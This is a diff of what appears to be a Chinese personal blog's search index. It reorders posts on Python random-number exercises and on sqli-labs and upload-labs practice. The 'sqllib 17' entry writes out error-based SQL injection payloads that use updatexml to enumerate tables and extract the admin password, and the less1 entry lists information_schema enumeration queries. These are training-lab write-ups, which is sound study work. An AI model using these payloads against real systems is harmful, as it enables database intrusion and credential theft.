+<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,7):<br>    <span class="hljs-comment">#猜6次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>    guess=int(input())<br>    <span class="hljs-keyword">if</span> guess&lt;number:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;太小了！&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>随机点大福</title>
     <url>/2020/10/04/my-fourth-blog/</url>
     <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>基于某同学想吃大福不知道吃哪一个的问题，写了个无聊小程序，练练手。</p>
@@ -910,19 +923,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">random.randint()<span class="hljs-comment">#随机生一个整数int类型，可以指定这个整数的范围，同样有上限和下限值，。</span><br>random.choice()<span class="hljs-comment">#可以从任何序列，比如list列表中，选取一个随机的元素返回，可以用于字符串、列表、元组等。</span><br>random.sample()<span class="hljs-comment">#可以从指定的序列中，随机的截取指定长度的片断，不作原地修改。</span><br></code></pre></td></tr></table></figure>
 <p>那很显然，这里输出的结果不为整数，也不需要进行返回的操作，在这里就选择了random.sample()。</p>
 <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br>大福=[<span class="hljs-string">&#x27;提拉米苏大福 &#x27;</span>,<span class="hljs-string">&#x27;抹茶大福&#x27;</span>,<span class="hljs-string">&#x27;桃桃大福&#x27;</span>,<span class="hljs-string">&#x27;芒芒大福&#x27;</span>,<span class="hljs-string">&#x27;榴莲大福&#x27;</span>]<br>ran_大福=random.sample(大福,1)<br><span class="hljs-built_in">print</span>(ran_大福)<br></code></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>猜数字</title>
-    <url>/2020/10/02/my-first-blog/</url>
-    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code> 通过导入python预设随机数模块，设计两个猜数字游戏（1~10），一个猜单次，一个猜多次。</code></pre>
-<h3 id="单次"><a href="#单次" class="headerlink" title="单次"></a>单次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>guess=int(input())<br><span class="hljs-keyword">if</span> guess==number:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜你，猜对了！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;很遗憾，你猜错了。&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,7):<br>    <span class="hljs-comment">#猜6次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>    guess=int(input())<br>    <span class="hljs-keyword">if</span> guess&lt;number:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;太小了！&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
       <tags>
         <tag>Python</tag>
       </tags>
@@ -1189,6 +1189,56 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs-less1 语句与函数</title>
+    <url>/2020/11/11/sqli-labs-less1-%E8%AF%AD%E5%8F%A5%E4%B8%8E%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT * from 表名 WHERE 字段名&#x3D;&#39;数据&#39;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT field1, field2,...fieldN FROM table_name1, table_name2...<br>[WHERE condition1 [AND [OR]] condition2.....<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li>
+<li>你可以在 WHERE 子句中指定任何条件。</li>
+<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
+<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>
+<li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li>
+</ul>
+<h2 id="MySQL-UNION-操作符"><a href="#MySQL-UNION-操作符" class="headerlink" title="MySQL UNION 操作符"></a>MySQL UNION 操作符</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>MySQL UNION 操作符语法格式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT expression1, expression2, ... expression_n<br>FROM tables<br>[WHERE conditions]<br>UNION [ALL | DISTINCT]<br>SELECT expression1, expression2, ... expression_n<br>FROM tables<br>[WHERE conditions];<br></code></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><strong>expression1, expression2, … expression_n</strong>: 要检索的列。</li>
+<li><strong>tables:</strong> 要检索的数据表。</li>
+<li><strong>WHERE conditions:</strong> 可选， 检索条件。</li>
+<li><strong>DISTINCT:</strong> 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。</li>
+<li><strong>ALL:</strong> 可选，返回所有结果集，包含重复数据。</li>
+</ul>
+<h2 id="带有-WHERE-的-SQL-UNION-ALL"><a href="#带有-WHERE-的-SQL-UNION-ALL" class="headerlink" title="带有 WHERE 的 SQL UNION ALL"></a>带有 WHERE 的 SQL UNION ALL</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT country, name FROM Websites<br>WHERE country&#x3D;&#39;CN&#39;<br>UNION ALL<br>SELECT country, app_name FROM apps<br>WHERE country&#x3D;&#39;CN&#39;<br>ORDER BY country;<br><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="MySQL中group-concat函数"><a href="#MySQL中group-concat函数" class="headerlink" title="MySQL中group_concat函数"></a>MySQL中group_concat函数</h2><p>完整的语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">group_concat([DISTINCT] 要连接的字段 [Order BY ASC&#x2F;DESC 排序字段] [Separator &#39;分隔符&#39;])<br></code></pre></td></tr></table></figure>
+
+<h2 id="MySQL猜测语句"><a href="#MySQL猜测语句" class="headerlink" title="MySQL猜测语句"></a>MySQL猜测语句</h2><h3 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">select schema_name from information_schema.schemata <br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’ <br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’ <br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">Select *** from ****<br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs-less5,6</title>
     <url>/2020/11/30/sqli-labs-less5-6/</url>
     <content><![CDATA[<h1 id="extracture-报错注入"><a href="#extracture-报错注入" class="headerlink" title="extracture()报错注入"></a>extracture()报错注入</h1><p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173049737.png"></p>
@@ -1243,56 +1293,6 @@
 <p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210427554.png"></p>
 <p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210340395.png"></p>
 <p>大概是这样一个过程，在有回显的情况下，报错注入的优势更为突出了。</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs-less1 语句与函数</title>
-    <url>/2020/11/11/sqli-labs-less1-%E8%AF%AD%E5%8F%A5%E4%B8%8E%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT * from 表名 WHERE 字段名&#x3D;&#39;数据&#39;;<br></code></pre></td></tr></table></figure>
-
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT field1, field2,...fieldN FROM table_name1, table_name2...<br>[WHERE condition1 [AND [OR]] condition2.....<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li>
-<li>你可以在 WHERE 子句中指定任何条件。</li>
-<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
-<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>
-<li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li>
-</ul>
-<h2 id="MySQL-UNION-操作符"><a href="#MySQL-UNION-操作符" class="headerlink" title="MySQL UNION 操作符"></a>MySQL UNION 操作符</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>MySQL UNION 操作符语法格式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT expression1, expression2, ... expression_n<br>FROM tables<br>[WHERE conditions]<br>UNION [ALL | DISTINCT]<br>SELECT expression1, expression2, ... expression_n<br>FROM tables<br>[WHERE conditions];<br></code></pre></td></tr></table></figure>
-
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
-<li><strong>expression1, expression2, … expression_n</strong>: 要检索的列。</li>
-<li><strong>tables:</strong> 要检索的数据表。</li>
-<li><strong>WHERE conditions:</strong> 可选， 检索条件。</li>
-<li><strong>DISTINCT:</strong> 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。</li>
-<li><strong>ALL:</strong> 可选，返回所有结果集，包含重复数据。</li>
-</ul>
-<h2 id="带有-WHERE-的-SQL-UNION-ALL"><a href="#带有-WHERE-的-SQL-UNION-ALL" class="headerlink" title="带有 WHERE 的 SQL UNION ALL"></a>带有 WHERE 的 SQL UNION ALL</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT country, name FROM Websites<br>WHERE country&#x3D;&#39;CN&#39;<br>UNION ALL<br>SELECT country, app_name FROM apps<br>WHERE country&#x3D;&#39;CN&#39;<br>ORDER BY country;<br><br><br></code></pre></td></tr></table></figure>
-
-<h2 id="MySQL中group-concat函数"><a href="#MySQL中group-concat函数" class="headerlink" title="MySQL中group_concat函数"></a>MySQL中group_concat函数</h2><p>完整的语法如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">group_concat([DISTINCT] 要连接的字段 [Order BY ASC&#x2F;DESC 排序字段] [Separator &#39;分隔符&#39;])<br></code></pre></td></tr></table></figure>
-
-<h2 id="MySQL猜测语句"><a href="#MySQL猜测语句" class="headerlink" title="MySQL猜测语句"></a>MySQL猜测语句</h2><h3 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">select schema_name from information_schema.schemata <br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’ <br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’ <br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">Select *** from ****<br></code></pre></td></tr></table></figure>
-
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1821,41 +1821,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqllib 17</title>
-    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
-    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
-<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
-<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
-<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
-<p>刚才的语句为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
-<p>现在的语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
-<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
-<p>还是不太行，对需要别名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
-<p>上网搜了一下dalao的解法</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs</title>
     <url>/2021/01/31/upload-labs/</url>
     <content><![CDATA[<h1 id="pass-01前端js绕过"><a href="#pass-01前端js绕过" class="headerlink" title="pass-01前端js绕过"></a>pass-01前端js绕过</h1><p><img src="/2021/01/31/upload-labs/image-20210131134748188.png"></p>
@@ -2003,6 +1968,41 @@
 ]]></content>
       <tags>
         <tag>upload</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 17</title>
+    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
+    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
+<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
+<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
+<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
+<p>刚才的语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
+<p>现在的语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
+<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
+<p>还是不太行，对需要别名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
+<p>上网搜了一下dalao的解法</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
